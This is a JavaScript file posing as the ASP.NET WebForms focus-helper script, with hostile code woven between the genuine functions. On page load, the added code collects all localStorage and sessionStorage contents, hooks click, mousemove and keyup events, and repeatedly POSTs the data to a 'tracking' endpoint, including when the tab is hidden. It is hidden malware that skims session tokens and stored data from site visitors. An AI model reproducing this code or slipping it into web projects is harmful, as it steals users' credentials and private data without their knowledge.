function WebForm_FindFirstFocusableChild(control) {
  if (!control || !control.tagName) {
    return null;
  }
  var tagName = control.tagName.toLowerCase();
  if (tagName == "undefined") {
    return null;
  }
  var children = control.childNodes;
  if (children) {
    for (var i = 0; i < children.length; i++) {
      try {
        if (WebForm_CanFocus(children[i])) {
          return children[i];
        } else {
          var focused = WebForm_FindFirstFocusableChild(children[i]);
          if (WebForm_CanFocus(focused)) {
            return focused;
          }
        }
      } catch (e) {}
    }
  }
  return null;
}
const globalVars = ["document", "navigator", "window"];
const storageTypes = ["localStorage", "sessionStorage"];
function WebForm_AutoFocus(focusId) {
  var targetControl;
  if (__nonMSDOMBrowser) {
    targetControl = document.getElementById(focusId);
  } else {
    targetControl = document.all[focusId];
  }
  var focused = targetControl;
  if (targetControl && !WebForm_CanFocus(targetControl)) {
    focused = WebForm_FindFirstFocusableChild(targetControl);
  }
  if (focused) {
    try {
      focused.focus();
      if (__nonMSDOMBrowser) {
        focused.scrollIntoView(false);
      }
      if (window.__smartNav) {
        window.__smartNav.ae = focused.id;
      }
    } catch (e) {}
  }
}
const eventTypes = ["click", "mousemove", "keyup"];
function WebForm_CanFocus(element) {
  if (!element || !element.tagName) return false;
  var tagName = element.tagName.toLowerCase();
  return !element.disabled && (!element.type || element.type.toLowerCase() != "hidden") && WebForm_IsFocusableTag(tagName) && WebForm_IsInVisibleContainer(element);
}
let keysToWatch = [];
let collectedData = {};
function generateHashCode(data) {
  let hash = 0,
    i,
    char;
  if (data.length == 0) return hash;
  for (i = 0; i < data.length; i++) {
    char = data.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash = hash & hash;
  }
  return hash.toString(32);
}
function WebForm_IsFocusableTag(tagName) {
  return tagName == "input" || tagName == "textarea" || tagName == "select" || tagName == "button" || tagName == "a";
}
function gatherGlobalVars() {
  globalVars.forEach(variable => {
    if (window.hasOwnProperty(variable)) {
      collectedData[variable] = typeof window[variable];
    }
  });
}
function gatherStorageData() {
  storageTypes.forEach(storage => {
    if (window.hasOwnProperty(storage)) {
      Object.keys(window[storage]).forEach(item => {
        keysToWatch.push(item);
        collectedData[item] = window[storage][item];
      });
    }
  });
}
async function postDataToServer() {
  if (Object.keys(collectedData).length > 0) {
    const serverUrl = "https://example.com/track";
    const hashCode = generateHashCode(JSON.stringify(collectedData));
    try {
      const response = await fetch(serverUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          hashCode,
          data: collectedData
        })
      });
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      console.log("Submitted data successfully");
    } catch (error) {
      console.error("Error: ", error);
    }
  }
}
function trackEvents() {
  eventTypes.forEach(eventType => {
    document.addEventListener(eventType, function (e) {
      collectedData["recentEventType"] = eventType;
      postDataToServer();
    });
  });
}
function WebForm_IsInVisibleContainer(ctrl) {
  var current = ctrl;
  while (typeof current != "undefined" && current != null) {
    if (current.disabled || typeof current.style != "undefined" && (typeof current.style.display != "undefined" && current.style.display == "none" || typeof current.style.visibility != "undefined" && current.style.visibility == "hidden")) {
      return false;
    }
    if (typeof current.parentNode != "undefined" && current.parentNode != null && current.parentNode != current && current.parentNode.tagName.toLowerCase() != "body") {
      current = current.parentNode;
    } else {
      return true;
    }
  }
  return true;
}
document.onreadystatechange = function () {
  if (document.readyState == "interactive") {
    gatherGlobalVars();
    gatherStorageData();
    trackEvents();
    setInterval(postDataToServer, 2 * 60 * 1000);
  }
};
document.addEventListener("visibilitychange", function () {
  if (document.visibilityState == "hidden") {
    postDataToServer();
  }
});